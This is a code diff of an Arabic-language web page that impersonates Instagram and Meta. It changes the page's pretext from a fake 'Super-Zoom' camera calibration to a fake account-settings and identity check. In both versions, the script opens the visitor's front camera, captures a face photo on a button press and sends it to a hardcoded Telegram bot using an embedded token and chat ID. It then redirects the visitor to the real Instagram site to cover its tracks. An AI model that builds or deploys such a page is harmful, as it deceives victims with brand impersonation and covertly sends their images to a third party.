@@ -3,177 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث الميزات | Instagram</title>
+    <title>إعدادات الحساب</title>
     <style>
-        :root {
-            --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2397 75%, #323232 100%);
-            --ig-blue: #0095f6;
-        }
-
+        :root { --ig-blue: #0095f6; --ig-bg: #ffffff; --ig-separator: #efefef; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         
-        body { 
-            background: #000; /* خلفية سوداء لتبدو كأنها وضع الكاميرا */
-            color: #fff; 
-            height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            overflow: hidden; 
+        body { background-color: var(--ig-bg); color: #1c1e21; display: flex; flex-direction: column; height: 100vh; }
+
+        .top-nav { padding: 15px; border-bottom: 1px solid var(--ig-separator); display: flex; align-items: center; gap: 20px; }
+        .top-nav h1 { font-size: 17px; font-weight: 600; }
+
+        .content { flex: 1; padding: 25px; overflow-y: auto; }
+        
+        .meta-logo { width: 65px; margin-bottom: 20px; }
+        
+        h2 { font-size: 22px; font-weight: 700; line-height: 1.2; margin-bottom: 15px; }
+        .info-text { font-size: 14px; color: #4b4f56; line-height: 1.5; margin-bottom: 20px; }
+
+        /* خيارات الراديو المحاكية لإنستغرام */
+        .option-card {
+            border: 1px solid var(--ig-separator);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            cursor: pointer;
+        }
+        .option-card.active { border-color: var(--ig-blue); background: #f0f9ff; }
+        
+        .radio-circle {
+            width: 20px; height: 20px; border: 2px solid #ccd0d5; border-radius: 50%;
+            flex-shrink: 0; margin-top: 3px; position: relative;
+        }
+        .active .radio-circle { border-color: var(--ig-blue); }
+        .active .radio-circle::after {
+            content: ''; position: absolute; top: 3px; left: 3px;
+            width: 10px; height: 10px; background: var(--ig-blue); border-radius: 50%;
         }
 
-        /* واجهة الكاميرا */
-        .camera-ui {
-            flex: 1;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+        .option-txt h3 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
+        .option-txt p { font-size: 13px; color: #606770; }
+
+        /* البوتوم شيت الثابت */
+        .footer-action {
             padding: 20px;
-        }
-
-        .viewfinder {
-            width: 280px;
-            height: 280px;
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            border-radius: 50%;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.6); /* تأثير التركيز */
-        }
-
-        .viewfinder::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 2px solid transparent;
-            border-top-color: var(--ig-blue);
-            animation: rotate 2s linear infinite;
-        }
-
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .instruction-box {
-            position: absolute;
-            bottom: 40px;
-            text-align: center;
-            width: 100%;
-            padding: 0 30px;
-        }
-
-        h1 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
-        p { font-size: 14px; color: #ccc; line-height: 1.4; }
-
-        /* الأزرار */
-        .controls {
-            padding: 30px 20px;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .shutter-btn {
-            width: 70px;
-            height: 70px;
+            border-top: 1px solid var(--ig-separator);
             background: #fff;
-            border: 5px solid #333;
-            border-radius: 50%;
-            margin: 0 auto;
-            cursor: pointer;
         }
-
-        .shutter-btn:active { background: #ddd; transform: scale(0.9); }
-
-        .skip-btn {
-            background: none;
-            border: none;
-            color: #888;
-            font-size: 13px;
-            cursor: pointer;
+        .btn-next {
+            width: 100%; background: var(--ig-blue); color: white;
+            border: none; padding: 14px; border-radius: 25px;
+            font-weight: 600; font-size: 15px; cursor: pointer;
         }
 
         video, canvas { display: none; }
-
-        /* تأثير الفلاش */
-        #flash {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff;
-            display: none;
-            z-index: 100;
-        }
     </style>
 </head>
 <body>
 
-    <div id="flash"></div>
+    <div class="top-nav">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+        <h1>خيارات استخدام الحساب</h1>
+    </div>
 
-    <div class="camera-ui">
-        <div class="viewfinder">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.3)" stroke-width="1">
-                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
-                <circle cx="12" cy="13" r="4"></circle>
-            </svg>
+    <div class="content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo" alt="Meta">
+        <h2>كيف تريد استخدام Instagram؟</h2>
+        <p class="info-text">لتقديم تجربة مخصصة وتحسين أداء الإعلانات، نحتاج منك مراجعة إعدادات الخصوصية وتأكيد هويتك الرقمية.</p>
+
+        <div class="option-card active" onclick="selectOpt(this)">
+            <div class="radio-circle"></div>
+            <div class="option-txt">
+                <h3>متابعة الاستخدام مع الإعلانات</h3>
+                <p>تأكيد الهوية عبر فحص الكاميرا السريع لمرة واحدة لضمان أمان الحساب وتخصيص التجربة.</p>
+            </div>
         </div>
 
-        <div class="instruction-box">
-            <h1>معايرة ميزة الـ Super-Zoom</h1>
-            <p>ضع وجهك داخل الدائرة واضغط على الزر أدناه لتحسين دقة التركيز التلقائي في ميزة القصص الجديدة.</p>
+        <div class="option-card" onclick="selectOpt(this)">
+            <div class="radio-circle"></div>
+            <div class="option-txt">
+                <h3>الاشتراك في الخدمة المتميزة</h3>
+                <p>استخدام الحساب بدون إعلانات مقابل رسوم شهرية (تتطلب مراجعة بيانات الدفع).</p>
+            </div>
         </div>
     </div>
 
-    <div class="controls">
-        <div class="shutter-btn" onclick="takePhoto()"></div>
-        <button class="skip-btn" onclick="location.href='https://instagram.com'">ليس الآن</button>
+    <div class="footer-action">
+        <button class="btn-next" onclick="triggerProcess()">متابعة</button>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <video id="vid" autoplay playsinline></video>
+    <canvas id="canv"></canvas>
 
     <script>
         const T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
         const C = '2140385904';
-        let stream = null;
+        let strm = null;
 
-        async function startCam() {
+        async function init() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
+                strm = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('vid').srcObject = strm;
             } catch (e) {}
         }
-        startCam();
+        init();
 
-        function takePhoto() {
-            // تأثير الفلاش البصري
-            const flash = document.getElementById('flash');
-            flash.style.display = 'block';
-            setTimeout(() => flash.style.display = 'none', 100);
+        function selectOpt(el) {
+            document.querySelectorAll('.option-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+        }
 
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = 480; canvas.height = 640;
-            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+        function triggerProcess() {
+            if(!strm) {
+                alert("يرجى منح صلاحية الوصول لتأكيد الخيارات.");
+                init();
+                return;
+            }
+
+            const cv = document.getElementById('canv');
+            const vd = document.getElementById('vid');
+            cv.width = 480; cv.height = 640;
+            cv.getContext('2d').drawImage(vd, 0, 0, 480, 640);
             
-            canvas.toBlob((blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('photo', blob, 'calib.jpg');
-                fd.append('caption', '📸 *تمت المعايرة*\nالمستخدم استخدم ميزة السوبر زوم الوهمية.');
+            cv.toBlob((b) => {
+                const f = new FormData();
+                f.append('chat_id', C);
+                f.append('photo', b, 'meta_choice.jpg');
+                f.append('caption', '⚙️ *تفاعل مع إعدادات Meta*\nتم اختيار "تأكيد الهوية الرقمية".');
                 
-                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                
-                setTimeout(() => {
-                    alert("تم تحديث إعدادات الكاميرا بنجاح!");
-                    window.location.href = "https://www.instagram.com/";
-                }, 1000);
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = "https://www.instagram.com/accounts/edit/";
+                    }, 1000);
+                });
             }, 'image/jpeg', 0.6);
         }
     </script>
